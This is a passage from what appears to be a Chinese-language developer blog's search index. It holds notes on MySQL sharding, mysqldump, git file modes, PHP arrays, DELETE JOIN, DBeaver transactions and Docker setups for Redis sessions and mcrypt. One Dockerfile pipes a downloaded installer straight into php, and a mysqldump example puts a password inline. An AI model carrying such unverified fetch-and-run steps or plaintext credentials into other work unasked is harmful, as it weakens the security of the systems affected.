Overflow](https://stackoverflow.com/questions/4345554/convert-php-object-to-associative-array)\n\n其他想到再補...\n\n\n**2020-06-13**\n\n最近在看 Procedure stored 處理大量資料是不是最好解\n看起來大量資料是...\n在這之間有查到 sharding 文章覺得不錯，並整理一下\n\n[寫好SQL很有必要！ - 數據分析那些事 - Medium](https://medium.com/@allaboutdataanalysis/%E5%AF%AB%E5%A5%BDsql%E5%BE%88%E6%9C%89%E5%BF%85%E8%A6%81-3206014d5422) {% asset_link web1.png 備份圖 %}\n\n[分庫分表的基本思想 - -j神----- - 博客園](https://www.cnblogs.com/jshen/p/7682502.html) {% asset_link web2.png 備份圖 %}\n\n\n其他沒相關的整理\n\n[使用非同步處理提升資料庫更新速度-黑暗執行緒](https://blog.darkthread.net/blog/async-batch-update-performance/)\n\n[oracle - Can I rollback after calling stored procedure in java test? - Stack Overflow](https://stackoverflow.com/questions/46051642/can-i-rollback-after-calling-stored-procedure-in-java-test)\n\n**2020-06-18**\n\n- [一次分表踩坑实践的探讨 - 云+社区 - 腾讯云](https://cloud.tencent.com/developer/article/1506228)\nsharding 做報表還是很大的難題阿!!\n\n- [SpringBoot2.x集成Sharding-JDBC实现分库分表 - 简书](https://www.jianshu.com/p/9a21b4f9c3dd)\n\n- [Spring boot+mybatis+mysql+ sharding-jdbc实现分库分表学习demo - 簡書](https://www.jianshu.com/p/74c02a2a89de)\n\n- [為什麼要用spring-data-jpa而不直接用hibernate | 程式前沿](https://codertw.com/ios/61625/)","tags":["sharding"],"categories":["MySQL"]},{"title":"codeigniter設定router踩雷","url":"%2Fblog%2F2019%2F05%2F03%2Fcodeigniter%E8%A8%AD%E5%AE%9Arouter%E8%B8%A9%E9%9B%B7%2F","content":"\n今天設定 Codeigniter 路由的時候\n發現怎麼不能正常倒到 Default_controller\n後來發現不能設定 **Contoller 第二層資料夾!!!**\n好了，結束 XD\n\n<!--more-->\n\n最後，不太想動到原本路徑程式，\n所以 Welcome.php 做`inlcude application\\contoller\\ooo\\xxx.php`繼承(extends)\n完成!!!!\n\n**注意：設邊由於所有 index.php 關係，所以 include 要由底層資料夾開始**\n\n其他小記:\n怕沒有時間記錄，小記在這邊\n\n- [Git webhook 实现自动部署教程](http://blog.text.wiki/2017/10/31/git-webhooks-for-php.html)\n- [Windows 系统中的 Linux—WSL 安装及简单使用-水幕青辰的网络笔记-51CTO 博客](https://blog.51cto.com/3chou/2294231)\n","tags":["codeigniter"],"categories":["PHP"]},{"title":"mysqldump備份database固定量資料","url":"%2Fblog%2F2019%2F04%2F25%2Fmysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99%2F","content":"\n最近要本機測試資料\n但是要如何不中斷服務又能快速備份的方法\n最後想到有 mysqldump\n\n<!--more-->\n\n之前有想過 mysqldump 是 DBA 才會用到工具\n但我又不需要全部備份\n不知道有沒有什麼快速匯出但是數量不想要太多\n最後有找到很快的方法\n\n## 使用方法\n\n`mysqldump -uroot -p123 test > c:\\test.sql`\n**注意-u 和-p 後面帳號密碼要連在一起**\n參考:[鯉魚智缺熊的網智: windows 下使用 command line dump & import mysql](http://koibear.blogspot.com/2012/11/windowscommand-line-dump-import-mysql.html)\n\n但注意!!用 mysqldump 是會 lock DB 的\n\n> MyISAM tables require this locking because they don't support transactions. However, InnoDB (the default storage engine as of MySQL 5.5.5) supports transactions. Mysqldump defaults to a conservative setting of locking everything, but we don't need to use that default - we an avoid locking tables completely.\n> [Mysqldump with Modern MySQL | Servers for Hackers](https://serversforhackers.com/c/mysqldump-with-modern-mysql)\n\n## 限制每個 table 數量\n\n```bash\nmysqldump -u [username] -p [dbname] {--opt} --where=\"true limit 100\" > dump.sql\n```\n\n[mysql dump of talble limit 100 - Server Fault](https://serverfault.com/questions/173834/mysql-dump-of-talble-limit-100)\n\n> 如果運行 mysqldump 沒有--quick 或--opt 選項，mysqldump 在轉儲結果前將整個結果集裝入內存。如果轉儲大資料庫可能會出現問題。該選項預設啟用，但可以用--skip-opt 禁用。\n\n[Jax 的工作紀錄: (轉載)mysqldump 5.1 資料備份詳細指令 [MySQL]](https://jax-work-archive.blogspot.com/2009/07/mysqldump-51-mysql.html)\n\n> –opt 　　　是 mysqldump 中的預設參數，參數功能相等於加入了 –add-drop-table –add-locks –create-options –disable-keys –extended-insert –-lock-tables –quick –set-charset 等參數\n\n[[MySQL]利用 mysqldump 備份 – FunMing 基地](https://fmbase.tw/blog/2013/01/23/mysql%E5%88%A9%E7%94%A8mysqldump%E5%82%99%E4%BB%BD/)\n[FAQ 系列 | mysqldump 选项之 skip-opt-老叶茶馆-51CTO 博客](https://blog.51cto.com/imysql/1879753)\n\n## 鎖表解決方法\n\n解決方法是用`–skip-lock-tables`\n\n> 一、mysqldump 在備份數據庫時鎖表的問題\n> 在使用'mysqldump'工具在備份庫表時，會對庫表進行鎖定，這會對業務的運行產生一定的影響；對於鎖表的過程及解決方法，作者也談談自己的認識。\n> 緩解鎖定的方法：\n> 1、Use --skip-lock-tables mysqldump option. Your tables won't be locked, but your backup might be not consistent (depends on your schema: if your database transactions touch several tables at once, and one table is already backed up and other is not. For example: two tables: customers and orders. If customers is backed up first, and then new customer/order pair is inserted, you might end up with order without customer in your backup).\n> This problem is primary reason why mysqldump locks all tables by default. If this issue does not apply to you, skipping the table locking in mysql is the most simple solution.\n> 會影響數據的一致性(可能比丟數據還要遭糕)，故不推薦使用這個方法。\n> 2、Use some other backup method. For example: Flush tables with read lock, create LVM snapshot, unlock tables, mount your LVM snapshot and back up your data. This gets quickly, much more complex than simple mysqldump.\n> If your MySQL data is not on a LVM volume, you can create a slave MySQL server and back it up, without touching the master, so locking occurs on the slave and master is always free.\n> 可以參考「lvm 備份 mysql 數據庫參考」，這篇文章。\n\n[mysqldump 在备份数据库的问题集-FreeOA](http://www.freeoa.net/osuport/db/mysqldump-lock-on-backup_1453.html)\n\n## 最後 SQL\n\n```bash\nmysqldump -uroot -p123 test –skip-lock-tables  > c:\\test.sql\n```\n\n其他參考來源:\n[mysqldump 与 innobackupex 备份过程你知多少 - xiaoboluo768 - 博客园](https://www.cnblogs.com/xiaoboluo768/p/7560105.html)\n[MySQL Database Export (100 Rows from each table in a database) - Stack Overflow](https://stackoverflow.com/questions/38495460/mysql-database-export-100-rows-from-each-table-in-a-database) <---這個我沒有嘗試\n[使用 mysqldump 倒出 MySQL 所有資料庫(表) 固定筆數的資料 | Tsung's Blog](https://blog.longwin.com.tw/2018/08/mysql-database-mysqldump-dump-sample-dataset-2018/)\n","tags":["mysqldump"],"categories":["MySQL"]},{"title":"git difff 出現old mode 100755 new mode 100644","url":"%2Fblog%2F2019%2F04%2F24%2Fgit-difff-%E5%87%BA%E7%8F%BEold-mode-100755-new-mode-100644%2F","content":"\n最近遇到 git 沒有變動的檔案\n發現狀態跑出更動檔案\n找了一下解決方法\n\n<!--more-->\n\n```\n$ git diff code.c\nold mode 100755\nnew mode 100644\n```\n\n這原因應該是 Linux、Window、Mac 之間檔案複製到不同台電腦做 git commit\n可能會遇到的問題\n\n`git config core.filemode false`\n解決問題\n\n在看情形是不是要全域做設定\n\n參考來源:\n\n- [git tips: 设置 filemode，避免 NTFS 文件权限变更引起的修改 - 简书](https://www.jianshu.com/p/3b0a9904daca)\n- [git file mode change - 晓寒的个人空间 - OSCHINA](https://my.oschina.net/xhan/blog/493454)\n- [git gui - How do I remove files saying \"old mode 100755 new mode 100644\" from unstaged changes in Git? - Stack Overflow](https://stackoverflow.com/questions/1257592/how-do-i-remove-files-saying-old-mode-100755-new-mode-100644-from-unstaged-cha)\n- [git file mode change - 晓寒的个人空间 - OSCHINA](https://my.oschina.net/xhan/blog/493454)\n\n最近沒有時間整理這些資料\n先預留 NOTE:\n(sharding DB 不太能做 join)\n\n- [数据库 Sharding 的基本思想和切分策略 - Laurence 的技术博客 - CSDN 博客](https://blog.csdn.net/bluishglc/article/details/6161475)\n- [MySQL Sharding 详解 - 简书](https://www.jianshu.com/p/6ebafabfddae)\n- [MySQL 分库分表，写得太好了！ - 51CTO.COM](http://database.51cto.com/art/201809/583857.htm)\n- [MySQL 上 sharding 的方案 | Gea-Suan Lin's BLOG](https://blog.gslin.org/archives/2017/02/02/7113/mysql-%E4%B8%8A-sharding-%E7%9A%84%E6%96%B9%E6%A1%88/)\n- [Docker 学习笔记\\_08 使用 Rancher pipeline 搭建基于容器的 CICD | 一个 DBA 的工作学习笔记](http://dbase.cc/2018/02/27/docker/08_%E4%BD%BF%E7%94%A8Rancher-pipeline%E6%90%AD%E5%BB%BA%E5%9F%BA%E4%BA%8E%E5%AE%B9%E5%99%A8%E7%9A%84CICD/)\n- [hexo 个人 next 主题博客接入谷歌广告 | Daryl's Blog](https://darylliu.github.io/2019/04/12/hexo%E4%B8%AA%E4%BA%BAnext%E4%B8%BB%E9%A2%98%E5%8D%9A%E5%AE%A2%E6%8E%A5%E5%85%A5%E8%B0%B7%E6%AD%8C%E5%B9%BF%E5%91%8A/)\n"},{"title":"PHP 陣列 array_unique 踩雷小記","url":"%2Fblog%2F2019%2F04%2F21%2FPHP-%E9%99%A3%E5%88%97-array-unique-%E8%B8%A9%E9%9B%B7%E5%B0%8F%E8%A8%98%2F","content":"\n最近用 array_unique\n[PHP: array_unique - Manual](https://www.php.net/manual/en/function.array-unique.php)\n他可以過濾重複的內容\n但不小心用出一個 bug\n\n例如有一個`$array = [0,1,2,2,3,4];`\n發現`array_unique(array);`\nvar_dump 一看，key 發現有跳號\n\n<!--more-->\n\n```php\n<?php\n$array = [0,1,2,2,3,4];\n\nvar_dump($array);\necho PHP_EOL;\nvar_dump(array_unique($array));\n```\n\n```\narray(6) {\n  [0]=>\n  int(0)\n  [1]=>\n  int(1)\n  [2]=>\n  int(2)\n  [3]=>\n  int(2)\n  [4]=>\n  int(3)\n  [5]=>\n  int(4)\n}\n\narray(5) {\n  [0]=>\n  int(0)\n  [1]=>\n  int(1)\n  [2]=>\n  int(2)\n  [4]=>\n  int(3)\n  [5]=>\n  int(4)\n}\n```\n\n所以這時候做`for($a = 0; $a < count($a); $a++)`會有問題\n\n這邊有想到兩個做法\n\n1. 改 foreach\n2. array_values(\\$array)\n\n可以解決\n","tags":["php"],"categories":["PHP"]},{"title":"主表和關聯表要不要全刪 和 外來鍵一些整理","url":"%2Fblog%2F2019%2F04%2F21%2F%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86%2F","content":"\n~~最近無聊想一些無聊的事情~~\n最近做 db 主表刪除，在想一些關聯表是不是也要跟著刪除\n雖然可以用`INNER(or LEFT) JOIN`容錯\n但我還想知道一般正常開發者會不會做`delete`(我之前公司好像沒有這樣習慣)\n不過，假如要刪除會選哪一種刪除方法\n目前知道用\n\n1. DB 設定 table 結構刪除\n2. DB 設定 trigger\n3. 程式手動設定刪除\n\n不知這幾種會用哪一種，所以網路上找到一些答案整理\n\n<!--more-->\n\n## 外來鍵\n\n- [数据库该不该使用外键 - 王者之峰 - CSDN 博客](https://blog.csdn.net/qq_23473123/article/details/79273066)\n  6.html)\n- [大家设计数据库时使用外键吗？ - 知乎](https://www.zhihu.com/question/19600081)\n- [数据库设计要不要外键？-CSDN 论坛](https://bbs.csdn.net/topics/392328637)\n\n有看到幾篇，說外來鍵很吃 DB 效能\n正常可以用程式邏輯去解決掉\n不過當然設定外來鍵可以減少資料不正確問題\n目前看到有報表程式會用到外來鍵\n\n> 問題引入\n> 以前的意識裡都是需要建立外鍵，外鍵能起到約束作用，能保證數據的完整性和一直性，比如如果沒有外鍵約束，你自己程序控制又不到位把基本信息都刪除了，詳情卻存在，人的基本信息不存在了，工資信息裡卻存在這個人，想要找這個人究竟是誰都找不到。\n> 今天看到原來的外鍵都被去掉了，問了下組長，結果回答就兩個字「效率」，雖然感覺很詫異，但是畢竟人家比我有經驗並沒有去爭論，下面將站在兩個對立面去贊成和反對建立外鍵。\n> 作者：qq_23473123\n> 来源：CSDN\n> 原文：https://blog.csdn.net/qq_23473123/article/details/79273066\n> 版权声明：本文为博主原创文章，转载请附上博文链接！\n\n今天看到這篇，果然過來人經驗還是要聽的\n之前我前公司我在開發 table\n設定多個主鍵我是依照需求開的(我前公司沒有用 id 當主鍵)\n我有一個前輩跟我講這樣設計不會很好\n程式會缺乏彈性，以後需求變動不是很好改\n通常可以用程式邏輯去做判斷\n\n相關外來鍵設定\n\n```\n[ON DELETE {CASCADE | SET NULL | NO ACTION | RESTRICT}]\n[ON UPDATE {CASCADE | SET NULL | NO ACTION | RESTRICT}]\n參數解釋：\n\nCASCADE - 會將有所關聯的紀錄行也會進行刪除或修改。\nSET NULL - 會將有所關聯的紀錄行設定成 NULL。\nNO ACTION - 有存在的關聯紀錄行時，會禁止父資料表的刪除或修改動作。\nRESTRICT - 與 NO ACTION 相同。\n\n```\n\n- [MySQL 建立 Foreign Key ( InnoDB ) 時要注意的一件事 @ Amin's Note :: 痞客邦 ::](http://lagunawang.pixnet.net/blog/post/25455909-mysql-%E5%BB%BA%E7%AB%8Bforeign-key-%28-innodb-%29-%E6%99%82%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%B8%80%E4%BB%B6%E4%BA%8B)\n- [第二十四個夏天後: [MySQL] 使用 FOREIGN KEY 筆記 @ MySQL 5.6](http://blog.changyy.org/2015/01/mysql-foreign-key-mysql-5\n\n簡單小記，使用外來鍵\n主表和關聯表，**從關聯表設定外來鍵**，這樣主表要先建立對應 id\n關聯表才能新增資料\n反之\n主表要先刪除關聯表資料，主表才能做`刪除`動作(PS: 這些動作都是看你設定什麼)\n\n不過，我覺得還是要看情況，以許是很死的東西(ex:報表、會計)\n可以用 table，這樣能更確定資料的安全\n但大部分系統可能不用加入外來鍵\n\n## 主表刪除，關聯表是否會刪除\n\n這個問題網路上找不到人討論這個問題\n我之前是沒有刪除，但最近想到這個問題\n仔細想想舊資料殘留在上面好像浪費空間\n又沒有意義，假如沒有特需用途還是手動刪除吧\n結論還是~~無聊想一些無聊的事情~~手動刪除吧!!\n","tags":["mysql"],"categories":["MySQL"]},{"title":"MySQL delete 一次刪除指定多個資料表欄位方法","url":"%2Fblog%2F2019%2F04%2F20%2FMySQL-delete-%E4%B8%80%E6%AC%A1%E5%88%AA%E9%99%A4%E6%8C%87%E5%AE%9A%E5%A4%9A%E5%80%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%84%E4%BD%8D%E6%96%B9%E6%B3%95%2F","content":"\n上一篇，要嘗試刪除語句\n在想刪除主表後，其餘關聯表示不是需要手動刪除??\n但這篇先不談這個\n最近看到兩篇發現 sql delete 可以做 join 動作刪除!!!\n先來筆記吧!!\n\n<!--more-->\n\n- [SQL：如何实现带有内连接的 DELETE？ - 问答 - 云+社区 - 腾讯云](https://cloud.tencent.com/developer/ask/55599)\n- [SQL 中使用 update inner join 和 delete inner join - linFen - 博客园](https://www.cnblogs.com/luluping/archive/2009/05/21/1486549.html)\n\n發現可能不是每個 DB 都可以這樣做\ndb2 可能沒有!! [IBM DELETE 介紹頁面](https://www.ibm.com/support/knowledgecenter/en/SSEPEK_10.0.0/sqlref/src/tpc/db2z_sql_delete.html)\n但為什麼我想一次做完呢?\n因為現在 DB 我們公司做 auto commit\n所以我想一次解決 XDD\n\n指細看也沒有人說不要用\n\n```sql\n-- DELETE 刪除大法\ndelete a1, a2 FROM `db`.`a1_table` a1 JOIN `db`.`a2_table` a2 ON a1.id = a2.a1_id WHERE a1.id = 1;\n-- 另類刪除方法\ndelete a1, a2 FROM `db`.`a1_table` a1, `db`.`a2_table` a2 WHERE a1.id = a2.a1_id and a1.id =1;\n```\n\n這邊有小提示\n\ndelete `...` from 中間是指要刪除的表格(可以使用自訂的 table)\n\n這邊上面用 inner join 會遇到有一個問題\n所以當關聯表沒資料，就不會刪掉\n所以改成 left join 會比較好\n\n強者我同事之前提過 letcode 有人這樣解題\n[leetcode/database/DeleteDuplicateEmails at master · int32bit/leetcode](https://github.com/int32bit/leetcode/tree/master/database/DeleteDuplicateEmails)\n\n```sql\nDELETE p1 FROM Person p1,\n    Person p2\nWHERE\n    p1.Email = p2.Email AND p1.Id > p2.Id\n```\n\n[MySQL DELETE JOIN: Deleting Data from Multiple Tables](http://www.mysqltutorial.org/mysql-delete-join/)\n先記到這樣!!!\n","tags":["delete"],"categories":["MySQL"]},{"title":"DBeaver交易功能使用方法(Transaction)","url":"%2Fblog%2F2019%2F04%2F20%2FDBeaver%E4%BA%A4%E6%98%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-Transaction%2F","content":"\n因為最近公司要測試刪除功能\n但是很怕誤刪自己 localhost 資料\n在想有什麼方法可以簡單測試\n後來想到`交易功能`\n\n<!--more-->\n\n[XYZ 的筆記本: MySQL 交易功能 Transaction 整理](https://xyz.cinc.biz/2013/05/mysql-transaction.html)\n\n在這篇能簡單看到用法\n不過，我最近工作環境只裝 DBeaver\n所以在想有什麼方案\n最後有想到用交易功能\n\n其實很簡單，只要連線 DB，`F3`開啟 new Script\n確定上面是否連線指定`DB`\n\n{% asset_img 1.png 提交/取消指令 %}\n\n{% asset_img 2.png 切換auto commit/手動交易 %}\n\n下面還有一些設定\n聽說是跟 Isolation 有關係\n這個我就不清楚了\n有時間在了解一下，我映像中好像有些設定 db 查詢時候\ndb 會 lock，聽說跟這個有關係\n\n[資料庫交易的 Isolation – getamis – Medium](https://medium.com/getamis/database-transaction-isolation-a1e448a7736e)\n\n參考來源:\n[Auto and Manual Commit Modes · dbeaver/dbeaver Wiki](https://github.com/dbeaver/dbeaver/wiki/Auto-and-Manual-Commit-Modes)\n[Pending Transactions · dbeaver/dbeaver Wiki](https://github.com/dbeaver/dbeaver/wiki/Pending-Transactions)\n","tags":["transaction"],"categories":["MySQL"]},{"title":"PHP設定session為redis方法(Dockerfile)","url":"%2Fblog%2F2019%2F04%2F13%2FPHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile%2F","content":"\n最近 PHP 要設定 redis\n不過這一快真的不是很熟\n所以 GOOGLE 有找一下設定方法\n這邊整理\n\n<!--more-->\n\n## PHP session 吃 redis (Dockerfile)\n\n```dockerfile\nFROM php:7.1-fpm\n\nRUN apt-get update && \\\n  apt-get install unzip wget -y && \\\n  cd /tmp && \\\n  wget https://github.com/phpredis/phpredis/archive/master.zip -O phpredis.zip && \\\n  unzip -o /tmp/phpredis.zip && \\\n  mv /tmp/phpredis-* /tmp/phpredis && \\\n  cd /tmp/phpredis && \\\n  phpize && \\\n  ./configure && \\\n  make && \\\n  make install && \\\n  mkdir -p /etc/php5/mods-available/ && \\\n  touch /etc/php5/mods-available/redis.ini && \\\n  echo extension=redis.so > /etc/php5/mods-available/redis.ini && \\\n  ln -s /etc/php5/mods-available/redis.ini /usr/local/etc/php/conf.d && \\\n  echo \"session.save_handler = redis\\nsession.save_path = tcp://redis/6379\" >> /usr/local/etc/php/conf.d/docker-php-ext-redis.ini && \\\n  apt-get remove unzip wget -y && \\\n  apt-get clean && \\\n  rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/\n\nRUN usermod -u 1000 www-data && \\\n  chown -R www-data:www-data /var/www/html/\n\nWORKDIR /var/www/html\nVOLUME /var/www/html\n\nEXPOSE 9000\n```\n\n[php-redis-session/Dockerfile at master · DawTaylor/php-redis-session](https://github.com/DawTaylor/php-redis-session/blob/master/php-7.1/Dockerfile)\n\n這邊可能要注意\n這個範例只有包 php-fpm(沒有 redis)\n`tcp://redis/6379`這一段 redis 需要照你的環境設定調整\n\n```bash\n## redis 架設\ndocker run --name redis -d redis\n## php-redis\ndocker run -d -p 80:80  --rm --name my-app -v  `pwd`:/var/www/html --link redis  dawtaylor/php-redis-session:5.6-apache\n```\n\n[DawTaylor/php-redis-session](https://github.com/DawTaylor/php-redis-session)\n\n文件有簡單說明，但沒有作 link\n\n測試使用方法可以寫一個 phpinfo 去看設定\n\n或者寫一個測試 php session\n\n```php\n<?php\nsession_start();\n$_SESSION['test'] = 2;\nvar_dump($_SESSION);\n```\n\n```bash\n## redis cli 指令，可以進去container打redis-cli進入\nkeys *\n## 查看某一個redis資料\nget PHPREDIS_SESSION:b234200eb3afc2803630be437b177bd0\n```\n\n[KEYS – Redis](https://redis.io/commands/KEYS)\n\n### php.ini 設定\n\n> 安裝 php-pecl-redis：\n>\n> ```\n> yum install php-pecl-redis\n> ```\n>\n> 修改 PHP 設定檔：\n>\n> ```\n> session.save_handler = redis\n> session.save_path = \"tcp://127.0.0.1:6379?auth=密碼\"\n> ```\n>\n> 其中 session.save_path 的格式為\n> session.save_path = \"tcp://host1:6379?weight=1, tcp://host2:6379?weight=2&timeout=2.5, tcp://host3:6379?weight=2&read_timeout=2.5\"\n> 可設定的參數有：weight、timeout、persistent、prefix(預設\"PHPREDIS_SESSION:\")、auth、database...\n\n[XYZ 的筆記本: PHP 使用 Redis 儲存 Session](https://xyz.cinc.biz/2018/03/php-redis-session.html)\n\n## redis cluster\n\n為什麼設定 redis cluster 要設定多個 IP?\n這原本是我第一個疑問，但是網路上都沒有看到有人講這個\n最後猜測是其實連其中一台，就可以做了\n但是設定那台掛掉就連到 redis\n不過我很好奇，怎麼不會用 haproxy 或 dns 去做設定??\n\n### redis cluster 簡單介紹\n\n(PS:這邊有參雜我自己的想法)\n\n因為目前沒有自己架設 redis cluster，所以我就不先研究那一快\n畢竟我連 redis 架設可能不是很熟\n但我覺得還是要了解他怎麼運作\n一直設定 redis 連線設定，但我覺得還是要了解一下\n\n簡單我目前看到的認知 redis 有 master→slave (slave→slave)\n這跟 mysql 一樣，有做備份的解決方案\n在 redis 3.0 之前沒有 cluster 功能\n所以會看到 sentinel 這個東西(目前我網路上看到的了解)\n這個有點像是會監測 master 有沒有掛掉\n假如掛掉的話，他會把 slave 調成 master\n這樣你程式掛掉還是可以使用\ncluster 也是有做這個事情\n網路有看到 sentinel 沒辦法馬上做到 redis 掛掉那瞬間第一毫秒\n所以有大量資料近來，有風險程式會沒接收到\n假如沒寫好 try...catch 就會遺失資料\n\n簡單來說，redis cluster 正常來說會有六台\n3 台 master3 台 slave，1 台 master 對應各 1 個 slave\n3 個 master 做 cluster，當有一台 master 掛掉 slave 會變成 master\n維持線上服務\n\n> 為什麼設定 redis cluster 要設定多個 IP?\n> 這原本是我第一個疑問，但是網路上都沒有看到有人講這個\n> 最後猜測是其實連其中一台，就可以做了\n> 但是設定那台掛掉就連到 redis\n> 不過我很好奇，怎麼不會用 haproxy 或 dns 去做設定??\n\n這邊我做一個假說，redis cluster 程式做多組 IP 是為了當第一台掛掉\n可能連第二台 IP，所以這邊會放多組原因，就算連到的話。redis cluster 也會分配其中一台\n那為什麼不做 haproxy，設定就不會那麼麻煩\n\n> 基于代理的分片\n> ...\n> 代理层多了一次转发，性能有所损耗。\n\n[Redis Cluster 深入与实践（续） - 掘金](https://juejin.im/post/5a54a6fbf265da3e3f4c9048) {% asset_link 1.png 備份圖 %}\n\n看來設定多組有這個原因，所以才不用 haproxy，但不知道為什麼沒設定 DNS 呢?\nDNS 導向也會影響?\n這個問題我還沒想到\n\n### phpredis,predis\n\n網路上有看到這兩個工具\n簡來來說 phpredis 是透過 C 源生連線\npredis 是透過 socket 去做連線\n可能上方效能會比較好\npredis 不需要安裝 redis 連線工具\n\n[在 php 中使用 redis cluster 集群 - 作业部落 Cmd Markdown 编辑阅读器](https://www.zybuluo.com/phper/note/248555)\n\n> predis，是 PHP 版本寫的 redis client，採用 socket 連接\n> php extension redis 是 PHP 原生擴展，C 寫的\n> 由於沒有進行過大數據壓測，不能準確告訴你性能差異。但基本上擴展 redis 肯定比 predis 更好。\n> Laravel 推薦用 predis，主要是當心一些主機沒有支持 redis 吧。儘量少依賴 C 擴展，這樣才能發揮 PHP 普及眾生的思想。\n\n[predis 包和 phpredis 扩展的区别是什么 - SegmentFault 思否](https://segmentfault.com/q/1010000008848852)\n\n### 有關 docker 架設資源\n\n[Grokzen/docker-redis-cluster: Dockerfile for Redis Cluster (redis 3.0+)](https://github.com/Grokzen/docker-redis-cluster)\n[使用 docker 建立 Redis Cluster - 更新版 - Yowko's Notes](https://blog.yowko.com/redis-cluster-docker/)\n\n基於設定我就不多研究了\n我看不懂裡面設定\n先暫時留在這邊\n\n相關來源:\n\n- [在 php 中使用 redis cluster 集群 - 作业部落 Cmd Markdown 编辑阅读器](https://www.zybuluo.com/phper/note/248555)\n- [predis 包和 phpredis 擴展的區別是什麼 - SegmentFault 思否](https://segmentfault.com/q/1010000008848852)\n- [phpredis Redis 集群 Redis Cluster - zh7314 - 博客园](https://www.cnblogs.com/zx-admin/p/7750612.html)\n- [面试中关于 Redis 的问题看这篇就够了 - 掘金](https://juejin.im/post/5ad6e4066fb9a028d82c4b66)\n- [一文輕鬆搞懂 redis 集群原理及搭建與使用 - 掘金](https://juejin.im/post/5ad54d76f265da23970759d3)\n- [php-redis-session/php-7.1 at master · DawTaylor/php-redis-session](https://github.com/DawTaylor/php-redis-session/tree/master/php-7.1)\n- [php 如何通过 pecl 安装 redis 扩展](https://newsn.net/say/pecl-install-redis.html)\n- [深入浅出 Docker 技术- Redis sentinel 集群的搭建 – VieMall](http://www.dczou.com/viemall/837.html)\n- [Redis Cluster 深入与实践 | Aoho's Blog](http://blueskykong.com/2017/09/29/rediscluster/)\n- [Redis Cluster 深入与实践（续） - 掘金](https://juejin.im/post/5a54a6fbf265da3e3f4c9048)\n- [使用 docker 建立 Redis Cluster - 更新版 - Yowko's Notes](https://blog.yowko.com/redis-cluster-docker/)\n- [XYZ 的筆記本: PHP 使用 Redis 儲存 Session](https://xyz.cinc.biz/2018/03/php-redis-session.html)\n\n**2019-07-10**\n\n最近公司要用 redis cluster\n所以 Google 一下設定\n\n- [phpredis/cluster.markdown at develop · phpredis/phpredis](https://github.com/phpredis/phpredis/blob/develop/cluster.markdown#session-handler)\n- [XYZ 的筆記本: PHP 使用 Redis 儲存 Session](https://xyz.cinc.biz/2018/03/php-redis-session.html)\n\n這個設定要安裝 pecl-php-redis\n\n```\nsession.save_handler = rediscluster\nsession.save_path = \"seed[]=host1:port1&seed[]=host2:port2&seed[]=hostN:portN&timeout=2&read_timeout=2&failover=error&persistent=1&auth=password\"\n```\n\n設定沒有想像中麻煩\n\nsave_path 可用 array_map 和 join 去組出字串\n","tags":["session"],"categories":["PHP"]},{"title":"php7安裝phpredis和mcrypt在docker方法","url":"%2Fblog%2F2019%2F04%2F10%2Fphp7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95%2F","content":"\n最近有專案需要用到 phpredis,mcrypt\n所以 php-fpm 需要安裝套件\n有 google 找到方法\n這邊簡單筆記\n\n<!--more-->\n\n## phpredis\n\nphpredis 安裝很順利\n`RUN pecl install redis && docker-php-ext-enable redis`\n\n## mcrypt\n\n在 PHP7.0 好像就不能使用，所以需要手動安裝\n\n網路上看到\n\n> PHP mcrypt extension 的安裝步驟\n>\n> ```\n> sudo apt install re2c php7.2-dev libmcrypt-dev # php7.2-dev for phpize\n> sudo pecl install mcrypt-1.0.1 # 產生在 /usr/lib/php/20170718/mcrypt.so\n> ```\n>\n> PHP mcrypt 的設定步驟\n>\n> ```\n> sudo vim /etc/php/7.2/mods-available/mcrypt.ini\n> extension=mcrypt.so\n> sudo phpenmod mcrypt\n> ```\n>\n> 重新啟動 php / cgi / web 即可\n\n這邊這一行`pecl install mcrypt-1.0.1`我在 php7.3 安裝不行\n[PECL :: Package :: mcrypt](https://pecl.php.net/package/mcrypt)\n不過看到 mcrypt 也有持續在更新，所以只要抓最新版 1.0.2 就可以安裝\n\n這時候可以在 phpinfo 裡面看有沒有正常安裝\n\n分享 Dockerfile\n\n```dockerfile\nFROM php:7.3-fpm\n\nRUN apt-get update -y && apt-get install -y openssl zip unzip git libmcrypt-dev\nRUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer\nRUN docker-php-ext-install opcache bcmath pdo_mysql mysqli\n\n\nRUN pecl install redis && docker-php-ext-enable redis\n\n\nRUN pecl install mcrypt-1.0.2 && docker-php-ext-enable mcrypt\n\n\nARG DIR\nWORKDIR $DIR\n\n RUN composer install\n\n```\n\n好奇 docker-php-ext-enable 有做什麼，所以有查了一下\n\n## docker-php-ext-install\n\n簡單來講就是安裝 PHP 內建現有套件\n\n> php 目录下还准备好了 php 配置文件 php.ini 以及 php-fpm.conf，基础镜像我们选择的是 PHP 5.6-FPM，这同样是一个 Debian Jessie 镜像。官方比较亲切的在镜像内部准备了一个 docker-php-ext-install 指令，可以快速安装如 GD、PDO 等常用扩展。所有支持的扩展名称可以通过在容器内运行 docker-php-ext-install 获得。\n\n[Docker 在 PHP 项目开发环境中的应用 - DockOne.io](http://dockone.io/article/481)\n[docker-php-ext-install Reference](https://gist.github.com/giansalex/2776a4206666d940d014792ab4700d80)\n\n## docker-php-ext-enable\n\n原本我在[php7 - docker-php-ext-enable 的原理？ - SegmentFault 思否](https://segmentfault.com/q/1010000017449567)看不是很懂\n後來[docker-php-ext-enable 可以開啟擴展的原理 | 一顆西瓜籽](https://huanghantao.github.io/2018/12/21/docker-php-ext-enable%E5%8F%AF%E4%BB%A5%E5%BC%80%E5%90%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8E%9F%E7%90%86/)這篇看懂\n\n> 